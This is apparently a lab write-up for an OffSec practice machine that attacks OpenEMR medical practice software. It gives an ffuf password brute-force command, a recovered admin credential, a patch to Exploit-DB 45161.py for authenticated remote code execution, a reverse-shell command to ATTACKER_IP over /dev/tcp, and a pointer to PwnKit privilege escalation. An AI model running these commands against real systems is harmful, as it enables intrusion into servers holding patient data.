# OpenEMR

OpenEMR is an open-source medical practice management application. In the observed path, OpenEMR was exposed under `/openemr/`; valid admin credentials led to authenticated RCE with Exploit-DB `45161.py`

## Discovery

OpenEMR login path:

```text
http://apex.offsec/openemr/interface/login/login.php?site=default
```

Anonymous SMB enumeration may also reveal OpenEMR-related documents:

```text
\\TARGET\docs
Path: C:\var\www\html\source\Documents

OpenEMR Success Stories.pdf
OpenEMR Features.pdf
```

The share path was also web-accessible:

```text
http://apex.offsec/source/Documents/
```

## Admin Credential Discovery

Brute force the OpenEMR login with `ffuf`. A successful login returned a `302` response with a different size from failed attempts:

```bash
ffuf -X POST \
  -H 'Host: apex.offsec' \
  -H 'Origin: http://apex.offsec' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://apex.offsec/openemr/interface/login/login.php?site=default' \
  -d 'new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1' \
  -u 'http://apex.offsec/openemr/interface/main/main_screen.php?auth=login&site=default' \
  -w /usr/share/wordlists/rockyou.txt \
  -t 2 \
  -fs 464
```

Working credential:

```text
admin:thedoctor
```

## Authenticated RCE

Exploit-DB `45161.py` worked after a Python 3 bytes/string fix:

```bash
searchsploit -m php/webapps/45161.py
```

On Python 3, the original PoC failed with a bytes/string encoding error:

```text
TypeError: a bytes-like object is required, not 'str'
```

Patch the command encoding line.

Before:

```python
_cmd = "|| echo " + base64.b64encode(args.cmd) + "|base64 -d|bash"
```

After:

```python
_cmd = b"|| echo " + base64.b64encode(args.cmd.encode("utf-8")) + b"|base64 -d|bash"
```

Confirm blind command execution with ICMP:

```bash
sudo tcpdump -i tun0 icmp
python3 45161.py http://apex.offsec/openemr -u admin -p thedoctor -c 'ping -c 4 ATTACKER_IP'
```

Run a reverse shell:

```bash
nc -nlvp 80
python3 45161.py http://apex.offsec/openemr -u admin -p thedoctor -c 'sh -i >& /dev/tcp/ATTACKER_IP/80 0>&1'
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
sh: 0: can't access tty; job control turned off
$ 
```

Successful shell context:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux APEX 4.15.0-143-generic #147-Ubuntu SMP Wed Apr 14 16:10:11 UTC 2021 x86_64 GNU/Linux
pwd
/var/www/openemr/interface/main
```

## Privilege Escalation

PwnKit (`CVE-2021-4034`) worked from the `www-data` shell. See [Linux Privilege Escalation](../linux-privilege-escalation/lin-priv-esc.md#cve-2021-4034---pwnkit-polkit-pkexec) for the version checks and exploit commands.

